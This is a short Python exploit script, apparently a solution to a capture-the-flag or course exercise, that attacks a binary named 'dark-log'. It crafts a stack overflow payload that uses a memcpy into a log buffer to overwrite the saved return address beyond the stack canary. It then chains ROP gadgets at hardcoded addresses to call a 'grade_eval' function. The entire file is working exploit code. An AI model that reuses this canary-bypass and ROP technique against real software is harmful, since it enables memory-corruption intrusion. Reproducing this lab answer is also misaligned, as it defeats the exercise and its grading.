#!/usr/bin/env python3
"""Use dark-log's memcpy destination to bypass input's stack canary."""
import struct
import sys

p64 = lambda value: struct.pack("<Q", value)
source = bytearray(b"A" * 128)
# memcpy starts at input's saved RIP when len is 168 (logMsg is rbp-0xa0).
source[0:8] = p64(0x4018A4)   # ret: align the ROP call
source[8:16] = p64(0x4018A3)  # pop rdi; ret in __libc_csu_init
source[16:24] = p64(4)
source[24:32] = p64(0x401677) # grade_eval
source[32:40] = p64(0)        # terminate after the requested output

# expression[128], logMsg[128], and len at input offset 256.
# gets writes its NUL at offset 260, before the input canary at offset 280.
payload = bytes(source) + b"B" * 128 + struct.pack("<i", 168)
assert len(payload) == 260
sys.stdout.buffer.write(payload)

